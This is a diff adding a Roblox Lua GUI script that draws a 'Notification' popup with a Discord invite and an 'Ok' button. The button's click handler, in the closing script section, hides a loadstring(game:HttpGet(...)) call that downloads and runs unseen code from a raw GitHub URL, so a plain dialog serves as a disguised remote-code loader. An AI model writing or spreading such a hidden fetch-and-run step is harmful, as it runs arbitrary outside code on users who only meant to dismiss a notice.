@@ -1,0 +1,155 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Blank = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local TopBar = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local BottomBar = Instance.new("Frame")
+local Blank_2 = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local Cancel = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local DropShadow = Instance.new("ImageLabel")
+local Heading = Instance.new("TextLabel")
+local SubHeading = Instance.new("TextLabel")
+
+--Properties:
+
+Blank.Name = "Blank"
+Blank.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+Main.Name = "Main"
+Main.Parent = Blank
+Main.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.343479455, 0, 0.346842438, 0)
+Main.Size = UDim2.new(0, 547, 0, 118)
+Main.ZIndex = 2
+
+TopBar.Name = "TopBar"
+TopBar.Parent = Main
+TopBar.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
+TopBar.BorderSizePixel = 0
+TopBar.Size = UDim2.new(0, 547, 0, 4)
+TopBar.ZIndex = 100
+
+ImageLabel.Parent = TopBar
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.Position = UDim2.new(0.0457038395, 0, 4, 0)
+ImageLabel.Size = UDim2.new(0, 41, 0, 40)
+ImageLabel.ZIndex = 329874632
+ImageLabel.Image = "rbxassetid://2961493545"
+
+BottomBar.Name = "BottomBar"
+BottomBar.Parent = Main
+BottomBar.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+BottomBar.BorderSizePixel = 0
+BottomBar.Position = UDim2.new(0, 0, 0.855593383, 0)
+BottomBar.Size = UDim2.new(0, 547, 0, 56)
+BottomBar.ZIndex = 100
+
+Blank_2.Name = "Blank"
+Blank_2.Parent = Main
+Blank_2.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
+Blank_2.BackgroundTransparency = 0.900
+Blank_2.BorderSizePixel = 0
+Blank_2.Position = UDim2.new(0.700182796, 0, 0.935334146, 0)
+Blank_2.Size = UDim2.new(0, 140, 0, 36)
+Blank_2.ZIndex = 100
+Blank_2.AutoButtonColor = false
+Blank_2.Font = Enum.Font.GothamSemibold
+Blank_2.Text = "Ok"
+Blank_2.TextColor3 = Color3.fromRGB(67, 67, 67)
+Blank_2.TextSize = 18.000
+
+UICorner.CornerRadius = UDim.new(0, 7)
+UICorner.Parent = Blank_2
+
+Cancel.Name = "Cancel"
+Cancel.Parent = Main
+Cancel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+Cancel.BackgroundTransparency = 1.000
+Cancel.BorderSizePixel = 0
+Cancel.Position = UDim2.new(0.522851944, 0, 0.943808675, 0)
+Cancel.Size = UDim2.new(0, 96, 0, 36)
+Cancel.Visible = false
+Cancel.ZIndex = 100
+Cancel.AutoButtonColor = false
+Cancel.Font = Enum.Font.GothamSemibold
+Cancel.Text = "Cancel"
+Cancel.TextColor3 = Color3.fromRGB(67, 67, 67)
+Cancel.TextSize = 18.000
+
+UICorner_2.CornerRadius = UDim.new(0, 7)
+UICorner_2.Parent = Cancel
+
+DropShadow.Name = "DropShadow"
+DropShadow.Parent = Main
+DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DropShadow.BackgroundTransparency = 1.000
+DropShadow.BorderSizePixel = 0
+DropShadow.Position = UDim2.new(-0.112687469, 0, -0.121869877, 0)
+DropShadow.Size = UDim2.new(1.23537493, 0, 1.62288165, 0)
+DropShadow.Image = "rbxassetid://297694300"
+DropShadow.ImageTransparency = 0.500
+
+Heading.Name = "Heading"
+Heading.Parent = Main
+Heading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Heading.BackgroundTransparency = 1.000
+Heading.Position = UDim2.new(0.151736751, 0, 0.0941176489, 0)
+Heading.Size = UDim2.new(0, 424, 0, 50)
+Heading.ZIndex = 100
+Heading.Font = Enum.Font.GothamSemibold
+Heading.Text = "Notification"
+Heading.TextColor3 = Color3.fromRGB(67, 67, 67)
+Heading.TextSize = 24.000
+Heading.TextXAlignment = Enum.TextXAlignment.Left
+
+SubHeading.Name = "SubHeading"
+SubHeading.Parent = Heading
+SubHeading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SubHeading.BackgroundTransparency = 1.000
+SubHeading.Position = UDim2.new(-0.00156517699, 0, 0.840000033, 0)
+SubHeading.Size = UDim2.new(0, 365, 0, 41)
+SubHeading.ZIndex = 101
+SubHeading.Font = Enum.Font.GothamSemibold
+SubHeading.Text = "Join the discord - https://discord.gg/UVbpU5p6sG"
+SubHeading.TextColor3 = Color3.fromRGB(125, 125, 125)
+SubHeading.TextSize = 18.000
+SubHeading.TextWrapped = true
+SubHeading.TextXAlignment = Enum.TextXAlignment.Left
+SubHeading.TextYAlignment = Enum.TextYAlignment.Top
+
+-- Scripts:
+
+local function UVJNZNT_fake_script() -- Blank_2.Animate 
+	local script = Instance.new('LocalScript', Blank_2)
+
+	local noob = script.Parent
+	
+	
+	Tween = function(Obj, Time, Settings)	
+		game:GetService("TweenService"):Create(Obj, TweenInfo.new(Time), Settings):Play()
+	end
+	
+	
+	script.Parent.MouseEnter:Connect(function()
+		Tween(noob, 0.5, {BackgroundTransparency = 0.75})
+	end)
+	
+	script.Parent.MouseLeave:Connect(function()
+		Tween(noob, 0.5, {BackgroundTransparency = 0.89})
+		script.Parent.MouseButton1Click:Connect(function()
+			script.Parent.Parent.Parent:Destroy()
+		end)
+		script.Parent.MouseButton1Click:Connect(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/garfieldscripter/sda/main/noo"))()
+		end)
+	end)
+end
+coroutine.wrap(UVJNZNT_fake_script)()
